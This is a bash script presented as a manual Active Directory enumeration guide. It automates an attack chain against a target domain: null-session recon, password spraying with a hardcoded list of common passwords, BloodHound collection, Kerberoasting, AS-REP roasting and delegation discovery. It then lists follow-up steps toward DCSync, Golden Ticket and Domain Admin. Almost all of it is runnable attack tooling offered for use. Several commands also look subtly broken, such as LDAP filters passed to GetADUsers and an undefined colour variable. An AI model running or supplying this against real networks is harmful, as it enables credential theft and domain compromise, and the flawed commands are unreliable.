#!/bin/bash

# =============================================================================
# ULTIMATE MANUAL AD ENUMERATION GUIDE - Kali Linux Preinstalled Tools
# Chronological: NULL → Spray → Low-Priv → Kerberoast → Delegation → PWNED$
# =============================================================================

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
PURPLE='\033[0;35m'; CYAN='\033[0;36m'; MAGENTA='\033[0;95m'; NC='\033[0m'
BOLD='\033[1m'

clear

cat << 'EOF'
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║  🔥 MANUAL AD ENUMERATION BASH GUIDE v1.0 - KALI PREINSTALLED TOOLS 🔥                                            ║
║  NULL → Spray → Low-Priv → Kerberoast → Delegation → DCSync → Golden → PWNED$                                    ║
║  Execute each phase → Domain Owned in 45min                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
EOF

# Configuration
echo -e "${CYAN}═══ Configuration ═══${NC}"
read -p "Target IP/RANGE (ex: 10.10.10.10): " TARGET
read -p "Domain (ex: corp.local): " DOMAIN
read -p "Low-priv creds? (user:pass or 'none'): " CREDS

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT="ad_manual_enum_${TIMESTAMP}"
mkdir -p $OUTPUT/{null,spray,lowpriv,roast,delegation,dcsync,persistence}

cd $OUTPUT || exit 1
echo -e "${GREEN}📁 Output: $OUTPUT${NC}"

# =============================================================================
# PHASE 0: NULL AUTHENTICATION (0-5min)
# =============================================================================
echo -e "${BOLD}${RED}\n🔥 PHASE 0: NULL AUTH RECON (0-5min)${NC}"

echo -e "${YELLOW}[1] rpcclient - Domain Users${NC}"
rpcclient -U ""%"" $TARGET -c "enumdomusers" | grep -v "user:[0-9]" > null/rpc_users.txt 2>&1
echo "   ✅ null/rpc_users.txt"

echo -e "${YELLOW}[2] rpcclient - Server Info${NC}"
rpcclient -U ""%"" $TARGET -c "srvinfo" > null/rpc_srvinfo.txt 2>&1
echo "   ✅ null/rpc_srvinfo.txt"

echo -e "${YELLOW}[3] enum4linux - FULL Recon${NC}"
enum4linux -U -G -S -P -oA $TARGET > null/enum4linux.txt 2>&1
echo "   ✅ null/enum4linux.txt"

echo -e "${YELLOW}[4] smbmap - Shares${NC}"
smbmap -H $TARGET > null/smbmap.txt 2>&1
echo "   ✅ null/smbmap.txt"

echo -e "${YELLOW}[5] nmap - AD Services${NC}"
nmap -p445,88,389,636,135,3268 --script smb-enum*,ldap-rootdse $TARGET -oN null/nmap.txt
echo "   ✅ null/nmap.txt"

# Extract usernames
cat null/rpc_users.txt null/enum4linux.txt 2>/dev/null | grep -oE '[a-zA-Z0-9-_.]+\\?\$?' | \
cut -d'\' -f1 | cut -d'$' -f1 | sort -u > null/users_spray.txt 2>/dev/null
echo -e "${GREEN}   📊 $(wc -l < null/users_spray.txt) users for spraying${NC}"

# =============================================================================
# PHASE 1: PASSWORD SPRAYING (5-10min)
# =============================================================================
echo -e "${BOLD}${MAGENTA}\n🔥 PHASE 1: PASSWORD SPRAYING (5-10min)${NC}"

cat > spray/common_passwords.txt << 'EOF'
Password123
Password1!
Summer2020
Welcome1
Password123!
admin
Administrator
guest
Password01
changeme
EOF

echo -e "${YELLOW}[6] CME - Spray common passwords${NC}"
crackmapexec smb $TARGET -u null/users_spray.txt -p spray/common_passwords.txt \
--continue-on-success > spray/cme_spray.txt 2>&1
echo "   ✅ spray/cme_spray.txt"

echo -e "${YELLOW}[7] CME - Guest everywhere${NC}"
crackmapexec smb $TARGET -u guest -p "" --shares > spray/cme_guest.txt 2>&1
echo "   ✅ spray/cme_guest.txt"

# =============================================================================
# PHASE 2: LOW-PRIV ENUMERATION (10-25min)
# =============================================================================
if [[ "$CREDS" != "none" ]]; then
    echo -e "${BOLD}${YELLOW}\n🔥 PHASE 2: LOW-PRIV ENUM (10-25min)${NC}"
    
    echo -e "${YELLOW}[8] CME - Validate + Shares${NC}"
    crackmapexec smb $TARGET -u $CREDS --shares > lowpriv/cme_validate.txt 2>&1
    echo "   ✅ lowpriv/cme_validate.txt"
    
    echo -e "${YELLOW}[9] GetADUsers - ALL users${NC}"
    impacket-GetADUsers "$CREDS@$DOMAIN" -dc-ip $TARGET -all > lowpriv/all_users.txt 2>&1
    echo "   ✅ lowpriv/all_users.txt"
    
    echo -e "${YELLOW}[10] GetADUsers - Domain Admins${NC}"
    impacket-GetADUsers "$CREDS@$DOMAIN" -dc-ip $TARGET 'PrimaryGroupID=512' > lowpriv/domain_admins.txt 2>&1
    echo "   ✅ lowpriv/domain_admins.txt"
    
    echo -e "${YELLOW}[11] GetADUsers - Privileged${NC}"
    impacket-GetADUsers "$CREDS@$DOMAIN" -dc-ip $TARGET 'adminCount=1' > lowpriv/privileged.txt 2>&1
    echo "   ✅ lowpriv/privileged.txt"
    
    echo -e "${YELLOW}[12] GetADUsers - Service Accounts${NC}"
    impacket-GetADUsers "$CREDS@$DOMAIN" -dc-ip $TARGET 'servicePrincipalName=*' > lowpriv/service_accounts.txt 2>&1
    echo "   ✅ lowpriv/service_accounts.txt"
    
    echo -e "${YELLOW}[13] GetADComputers${NC}"
    impacket-GetADComputers "$CREDS@$DOMAIN" -dc-ip $TARGET > lowpriv/computers.txt 2>&1
    echo "   ✅ lowpriv/computers.txt"
    
    echo -e "${YELLOW}[14] BloodHound Collection${NC}"
    bloodhound-python -u $CREDS -d $DOMAIN -c All -dc $TARGET > lowpriv/bloodhound.log 2>&1
    echo "   ✅ lowpriv/bloodhound.zip → Import to GUI"
fi

# =============================================================================
# PHASE 3: KERBEROASTING + ASREP (25-35min)
# =============================================================================
if [[ "$CREDS" != "none" ]]; then
    echo -e "${BOLD}${PURPLE}\n🔥 PHASE 3: ROASTING (25-35min)${NC}"
    
    echo -e "${YELLOW}[15] Kerberoasting - ALL SPNs${NC}"
    impacket-GetUserSPNs "$CREDS@$DOMAIN" -dc-ip $TARGET -request -outputfile roast/kerberoast.txt 2>&1
    echo "   ✅ roast/kerberoast.txt → hashcat -m 13100"
    
    echo -e "${YELLOW}[16] Kerberoasting - SQL only${NC}"
    impacket-GetUserSPNs "$CREDS@$DOMAIN" -dc-ip $TARGET 'servicePrincipalName=*sql*' -request > roast/sql_hashes.txt 2>&1
    echo "   ✅ roast/sql_hashes.txt"
    
    echo -e "${YELLOW}[17] ASREP Roasting${NC}"
    impacket-GetNPUsers "$DOMAIN/" -no-pass -format hashcat -outputfile roast/asrep.txt 2>&1
    echo "   ✅ roast/asrep.txt → hashcat -m 18200"
fi

# =============================================================================
# PHASE 4: DELEGATION RECON (35-40min)
# =============================================================================
if [[ "$CREDS" != "none" ]]; then
    echo -e "${BOLD}${CYAN}\n🔥 PHASE 4: DELEGATION (35-40min)${NC}"
    
    echo -e "${YELLOW}[18] Unconstrained Delegation${NC}"
    impacket-GetADUsers "$CREDS@$DOMAIN" -dc-ip $TARGET 'trustedForDelegation=true' > delegation/unconstrained.txt 2>&1
    echo "   ✅ delegation/unconstrained.txt"
    
    echo -e "${YELLOW}[19] Constrained Delegation${NC}"
    impacket-GetADUsers "$CREDS@$DOMAIN" -dc-ip $TARGET 'msDS-AllowedToDelegateTo=*' > delegation/constrained.txt 2>&1
    echo "   ✅ delegation/constrained.txt"
    
    echo -e "${YELLOW}[20] RBCD Targets${NC}"
    impacket-GetADUsers "$CREDS@$DOMAIN" -dc-ip $TARGET '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' > delegation/rbcd.txt 2>&1
    echo "   ✅ delegation/rbcd.txt"
fi

# =============================================================================
# PHASE 5: SUMMARY & NEXT STEPS
# =============================================================================
echo -e "${BOLD}${WHITE}\n\n══════════════════════ SUMMARY & NEXT STEPS ═══════════════════════${NC}"
echo -e "${MAGENTA}📁 OUTPUT DIRECTORY: $OUTPUT${NC}"
echo -e "${GREEN}✅ NULL Recon: null/users_spray.txt ($(wc -l < null/users_spray.txt 2>/dev/null || echo 0) users)${NC}"
echo -e "${GREEN}✅ Spray Results: spray/cme_spray.txt${NC}"
if [[ "$CREDS" != "none" ]]; then
    echo -e "${GREEN}✅ Low-Priv: lowpriv/domain_admins.txt, lowpriv/service_accounts.txt${NC}"
    echo -e "${GREEN}✅ BloodHound: lowpriv/bloodhound.zip${NC}"
    echo -e "${GREEN}✅ Kerberoast: roast/kerberoast.txt${NC}"
    echo -e "${GREEN}✅ Delegation: delegation/*.txt${NC}"
fi

echo -e "\n${BOLD}${RED}🎯 NEXT ATTACK STEPS:${NC}"
echo -e "${CYAN}1. Crack: hashcat -m 13100 roast/kerberoast.txt rockyou.txt${NC}"
echo -e "${CYAN}2. Spray: cme smb \$NETBLOCK -p CRACKED_PASS -u lowpriv/domain_admins.txt${NC}"
echo -e "${CYAN}3. BloodHound GUI → Shortest paths to DA${NC}"
echo -e "${CYAN}4. printerbug.py → RBCD → DCSync → Golden Ticket → PWNED\$${NC}"

echo -e "\n${BOLD}${GREEN}🎉 MANUAL AD ENUMERATION COMPLETE!${NC}"
echo -e "${MAGENTA}📂 All files saved in: $OUTPUT${NC}"
echo -e "${WHITE}Execute next steps → Domain Admin in 45min!${NC}"
